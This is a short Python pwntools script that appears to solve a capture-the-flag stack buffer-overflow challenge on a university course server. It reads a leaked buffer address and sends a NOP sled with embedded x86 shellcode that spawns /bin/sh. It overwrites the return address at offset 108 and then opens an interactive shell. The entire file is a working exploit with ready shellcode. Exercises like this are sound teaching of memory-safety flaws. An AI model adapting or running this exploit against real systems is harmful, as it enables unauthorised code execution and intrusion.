#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    p = process("./program")
else:    
    p = remote("ctf-fsi.fe.up.pt", 4001)

# Get the address of buffer
x = p.recvuntil(b"Give me your input:\n")
x = x.decode('utf-8')
pos = int(x[44:54], 16)
print("The address is: " + str(x[44:54]))

# Fill with NOP's
content = bytearray(0x90 for i in range(200))

s = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80").encode('latin-1')

start = 0
# difference between buffer and ebp addresses
offset = 108 
L = 4

# Put shellcode somewhere in the payload
content[start:start+len(s)] = s
#Decide return address value and put it somewhere in the payload
content[offset:offset+L] = (pos).to_bytes(L, byteorder='little')

p.sendline(content)
p.interactive()
